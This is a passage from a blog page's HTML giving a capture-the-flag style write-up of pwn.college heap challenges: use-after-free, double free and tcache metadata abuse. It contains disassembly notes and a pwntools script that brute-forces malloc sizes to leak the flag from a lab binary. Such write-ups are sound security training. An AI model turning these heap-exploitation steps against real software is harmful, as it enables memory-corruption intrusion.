+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772359731785-4a6ec8c5-f4ee-4ffa-b080-673c73c6e3f5.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772360082799-cbd54f5a-9067-4b40-a712-45a25ffdb7b5.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772360582712-b289d159-e0ef-41ac-87af-d9eaf2a671c2.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772360596114-d1150bb5-c306-4019-bd39-7dbdce7a8f17.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772362180467-a60194b0-a1e0-4616-9b96-78f8cc25522e.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772362310505-ed33c01f-3d6c-4e4d-97ec-2c1a49ede8a8.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772362499348-8aaf8d4f-f7c3-4e34-a19a-edf80eaa848b.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772363447460-29c43834-a017-4c2b-9577-8ba0d7151998.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772363459043-1e701751-027b-405c-b986-79e06e0b50ab.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772367666618-57bbdab0-9391-4853-bbf1-16f504a766ca.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772367738412-8e9fd599-b498-470f-a537-89a5183c364b.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772368152880-85102a4d-ae12-4eec-b92f-ab73c5a1c88d.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772368172841-1e504dab-261b-47f4-bcd2-e1e61f5a6903.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772368181133-5b27e257-b6f1-4128-98c3-a0cd9540f18a.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772369894262-54f7aeb1-6d6e-435f-bbb7-22810d41fe0f.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772369912789-445ce623-de89-4296-9c52-004f4e2b8800.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772370033933-0bb0d07f-3889-4fde-8122-9e8525078154.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772370724618-4bcc2945-b762-43b3-a7a2-d36a3c0d7965.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772370782605-8db091ec-f528-49a0-9097-fcb8fd247d00.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772371293447-a3c4b6a1-7723-405b-b065-695df01eed8e.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772371238667-a0762b8a-2e2f-4675-b93a-488e24a66cb0.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772371401708-b4804cf7-ed41-464c-94d7-282006b05e00.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772371883802-3107fdb2-e93c-445d-a779-6efd8bb95a9a.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772371897218-ec4d68ba-ed25-4b03-b994-a516c36384f3.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772372079212-f9653400-20d3-40e5-b4d7-b4d0c7b818b9.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772375033719-e630269e-2f17-4787-a6b3-6ba083df4253.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772375148696-e86ed9e1-b1ae-44fc-99e7-3587768ec398.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772375327657-a62f751c-000c-4826-8b73-815fc977d7dc.png">
+<meta property="article:published_time" content="2026-04-23T12:54:37.000Z">
+<meta property="article:modified_time" content="2026-04-23T13:26:17.101Z">
+<meta property="article:author" content="shark">
+<meta property="article:tag" content="heap">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770707942231-e0a84614-1d0f-4317-b757-569f33f58638.png">
+  
+  
+  
+  <title>pwn.college-pro sec-_Dynamic Allocator Misuse - shark&#39;s home</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ghostshark-pro.github.io","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#00FFFF","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>shark&#39;s home</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Terminal</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Arsenal</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Timeline</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Friends</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>Whoami</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>Terminal</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>Arsenal</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>Tags</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>Timeline</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/links/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-link-fill"></i>
+                  <span>Friends</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>Whoami</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>Grep</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="Light Mode"
+               data-label-dark="Dark Mode">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">Dark Mode</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/bg.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="pwn.college-pro sec-_Dynamic Allocator Misuse"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-23 20:54" pubdate>
+          2026年4月23日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          39k bytes
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          ETA: 328 min
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">pwn.college-pro sec-_Dynamic Allocator Misuse</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Welcome-to-back"><a href="#Welcome-to-back" class="headerlink" title="Welcome to back"></a><em><font style="color:#81DFE4;">Welcome to back</font></em></h1><h3 id="Dynamic-Allocator-Misuse"><a href="#Dynamic-Allocator-Misuse" class="headerlink" title="Dynamic Allocator Misuse"></a><font style="color:#2F8EF4;background-color:#FFFFFF;">Dynamic Allocator Misuse</font></h3><h4 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a><font style="color:rgb(120, 190, 32);background-color:rgb(16, 16, 16);">Use After Free</font></h4><h5 id="Freebie-Easy"><a href="#Freebie-Easy" class="headerlink" title="Freebie (Easy)"></a><font style="color:#2F8EF4;">Freebie (Easy)</font></h5><p>all right</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770707942231-e0a84614-1d0f-4317-b757-569f33f58638.png" srcset="/img/loading.gif" lazyload></p>
+<p>read_flag&#x3D;malloc(292)</p>
+<p>flag will be read in flag_buffer</p>
+<p>bin #17&#x3D;281 - 296</p>
+<p>we can malloc 293 and free</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770708253195-85bf3ad5-a37f-4bd9-aabf-f66e1679bef1.png" srcset="/img/loading.gif" lazyload></p>
+<p>the *ptr is saved</p>
+<p>then, read_flag and puts</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770708495010-ab36f1fc-207c-45d8-8379-f83b58569bd4.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Freebie-Hard"><a href="#Freebie-Hard" class="headerlink" title="Freebie (Hard)"></a><font style="color:#2F8EF4;">Freebie (Hard)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770709848832-52be86b6-2531-44b0-aab5-9bd08fb8855c.png" srcset="/img/loading.gif" lazyload></p>
+<p>rbp-0xa0 is 0x102 &#x3D; 258</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770709908469-0342a951-761d-4b0b-97e9-b040ca6fd0e2.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770710072433-73839255-07fd-42c4-960f-c62d750909f5.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770710149339-4a3587d2-0e79-4c13-b5fc-c7420fe8fa43.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Freebin-Feint-Easy"><a href="#Freebin-Feint-Easy" class="headerlink" title="Freebin Feint (Easy)"></a><font style="color:#2F8EF4;">Freebin Feint (Easy)</font></h5><p>create and exploit?</p>
+<p>the same as freebie</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770711082202-b154e8a2-7f04-4819-9a80-6dfd58398a0d.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Freebin-Feint-Hard"><a href="#Freebin-Feint-Hard" class="headerlink" title="Freebin Feint (Hard)"></a><font style="color:#2F8EF4;">Freebin Feint (Hard)</font></h5><p>pwndbg&gt; x&#x2F;s 0x2008</p>
+<p>0x2008: “&#x2F;flag”</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770713040668-c08da4b9-25b7-49d2-afb7-8301c96282fa.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770713088998-3ea2701d-5bea-4f59-be37-10c52dd8206b.png" srcset="/img/loading.gif" lazyload></p>
+<p>It takes the Flag content every 4 bytes for XOR</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770713415709-5c1ad8d5-c55c-4f8e-a508-3ae9eadc1843.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770714016268-c040a754-a15d-4228-88ad-695f139909cd.png" srcset="/img/loading.gif" lazyload></p>
+<p>Size &#x3D; (rand() (mod 872)) + 128</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770715049019-68c89af3-716e-413b-9355-64a4c666f980.png" srcset="/img/loading.gif" lazyload></p>
+<p>can send ‘int’</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770715748044-99be4d10-1e0c-47ab-934d-588524712836.png" srcset="/img/loading.gif" lazyload></p>
+<p>+\n</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs plain">In [7]: from pwn import *<br>   ...: i=1<br>   ...: def cyc():<br>   ...: <br>   ...:     size = 16*i<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/read_flag/quit):&#x27;,b&#x27;malloc\n&#x27;)<br>   ...:     p.sendline(str(size).encode())<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/read_flag/quit):&#x27;,b&#x27;free\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/read_flag/quit):&#x27;,b&#x27;read_flag\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/read_flag/quit):&#x27;,b&#x27;puts\n&#x27;)<br>   ...: <br>   ...: #p=process(b&#x27;/challenge/freebin-feint-hard&#x27;)<br>   ...: while True:<br>   ...:     p = process(&#x27;/challenge/freebin-feint-hard&#x27;)<br>   ...:     out = b&#x27;&#x27;<br>   ...:     cyc()<br>   ...:     i+=1<br>   ...:     out = p.recvall(1)<br>   ...:     if b&quot;pwn.&quot; in out:<br>   ...:         print(out)<br>   ...:         break<br>   ...: <br>   ...: p.close()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770715819460-cbd58aee-e284-40b9-97e2-7b469d789646.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Free-Flag-Fumble-Easy"><a href="#Free-Flag-Fumble-Easy" class="headerlink" title="Free Flag Fumble (Easy)"></a><font style="color:#2F8EF4;">Free Flag Fumble (Easy)</font></h5><p>This challenge can manage up to 16 unique allocations.</p>
+<p>In this challenge, the flag buffer is allocated 2 times before it is used.</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770728485239-f65bc2ab-dedd-4238-9496-99e73e56b3c9.png" srcset="/img/loading.gif" lazyload></p>
+<p>wow</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770731209445-812ba97e-1787-4808-a9a5-b2e88c43c604.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770731237205-ee729903-717e-411b-8b23-54ba892b706a.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Free-Flag-Fumble-Hard"><a href="#Free-Flag-Fumble-Hard" class="headerlink" title="Free Flag Fumble (Hard)"></a><font style="color:#2F8EF4;">Free Flag Fumble (Hard)</font></h5><p>0x000000000000138e &lt;+197&gt;:   mov    QWORD PTR [rbp-0x118],0x264</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770731473153-f00ea2c2-78ac-4bb7-8508-e84507c8a20c.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770731547644-b4b6aa3a-7d34-4734-9a05-4946ef789ebb.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="Metadata-Mischief"><a href="#Metadata-Mischief" class="headerlink" title="Metadata Mischief"></a><font style="color:rgb(120, 190, 32);background-color:rgb(16, 16, 16);">Metadata Mischief</font></h4><h5 id="Fickle-Free-Easy"><a href="#Fickle-Free-Easy" class="headerlink" title="Fickle Free (Easy)"></a><font style="color:#2F8EF4;">Fickle Free (Easy)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770993388116-3c5b993b-61ba-4031-b882-5b7125ccb784.png" srcset="/img/loading.gif" lazyload></p>
+<p>we fail to double free</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770993473506-dbcaa5bd-609d-4c7d-b206-c0b23aeefb7b.png" srcset="/img/loading.gif" lazyload></p>
+<p>wow</p>
+<p>we can utilize scanf to corrupt “key”-metadata</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770995429198-c2dfb702-9ccd-48c8-8428-1106c719fa18.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Fickle-Free-Hard"><a href="#Fickle-Free-Hard" class="headerlink" title="Fickle Free (Hard)"></a><font style="color:#2F8EF4;">Fickle Free (Hard)</font></h5><p>   0x0000000000001397 &lt;+174&gt;:   mov    QWORD PTR [rbp-0x98],0x0</p>
+<p>   0x00000000000013a2 &lt;+185&gt;:   mov    QWORD PTR [rbp-0xa0],0x131</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770995802757-d28752b8-74c8-471c-a2ce-af03919c62f8.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Malloc-Mirage-Easy"><a href="#Malloc-Mirage-Easy" class="headerlink" title="Malloc Mirage (Easy)"></a><font style="color:#2F8EF4;">Malloc Mirage (Easy)</font></h5><p>Apply the TCACHE metadata in an unintended manner to set a value</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770997913457-755bbed1-f838-4c6b-b82a-24eed3fe09d9.png" srcset="/img/loading.gif" lazyload></p>
+<p>？？？</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770999264658-68111ad2-dc28-4701-8338-d79d58ae2d5a.png" srcset="/img/loading.gif" lazyload></p>
+<p>test rax !&#x3D;0</p>
+<p>rax &#x3D; rbp - 0x130</p>
+<p>if rax!&#x3D;0 ; puts flag</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770999513629-def5c7b9-86e9-475b-8355-9a307a7fdc28.png" srcset="/img/loading.gif" lazyload></p>
+<p>write 16 8byte ‘0’ cyclically at read_flag-malloc</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770999720304-d5e7f610-13b5-405b-98d9-5943f541a88f.png" srcset="/img/loading.gif" lazyload></p>
+<p>store pointer to rbp - 0x130</p>
+<table>
+<thead>
+<tr>
+<th><strong><font style="color:rgb(31, 31, 31);">地址偏移</font></strong></th>
+<th><strong><font style="color:rgb(31, 31, 31);">内容</font></strong></th>
+<th><strong><font style="color:rgb(31, 31, 31);">备注</font></strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;rbp-0x18&lt;/font&gt;</code></td>
+<td><font style="color:rgb(31, 31, 31);">Stack Canary</font></td>
+<td><font style="color:rgb(31, 31, 31);">保护栈帧</font></td>
+</tr>
+<tr>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;rbp-0xa0&lt;/font&gt;</code></td>
+<td><font style="color:rgb(31, 31, 31);">User Input Buffer</font></td>
+<td><font style="color:rgb(31, 31, 31);">存储命令字符串</font></td>
+</tr>
+<tr>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;rbp-0x120&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;void *ptr_array[16]&lt;/font&gt;</code></td>
+<td><font style="color:rgb(31, 31, 31);">存储用户 malloc 的指针</font></td>
+</tr>
+<tr>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;rbp-0x130&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;void *secret_ptr&lt;/font&gt;</code></td>
+<td><font style="color:rgb(31, 31, 31);">存储 flag 堆块指针</font></td>
+</tr>
+</tbody></table>
+<p>we could malloc 1,2 and free 1,2</p>
+<p>read_flag and free</p>
+<p>make the *next is not NULL</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771088304809-4cec6943-da7a-44e2-9787-5da1a0403377.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Malloc-Mirage-Hard"><a href="#Malloc-Mirage-Hard" class="headerlink" title="Malloc Mirage (Hard)"></a><font style="color:#2F8EF4;">Malloc Mirage (Hard)</font></h5><p> 0x000000000000138f &lt;+198&gt;:   mov    QWORD PTR [rbp-0x128],0x310</p>
+<p>0x310&#x3D;784</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771088574473-8dc1773c-ac58-4b10-8228-b0c7885ed70d.png" srcset="/img/loading.gif" lazyload></p>
